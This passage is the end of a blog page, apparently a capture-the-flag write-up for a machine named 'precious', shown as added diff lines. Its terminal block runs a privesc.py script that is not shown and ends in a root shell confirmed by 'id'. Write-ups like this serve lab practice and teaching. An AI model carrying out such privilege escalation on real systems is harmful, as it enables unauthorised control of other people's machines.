+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">chmod</span> +x privesc.py 
+<span class="nv">$ </span>./privesc.py 
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>henry: 
+sh: 1: reading: not found
+root@precious:/tmp/p0zz1w4rr10r# <span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</code></pre></div></div>
+
+</div>
+        </div>
+        <footer class="about">
+    <div class="about__devider">*****</div>
+    <div class="about__text">
+        🛠️ Powered by Jekyll 🛠️
+        <br> 📖 Hosted on GitHub Pages 📖
+    </div>
+</footer>
+    </body>
+</html>
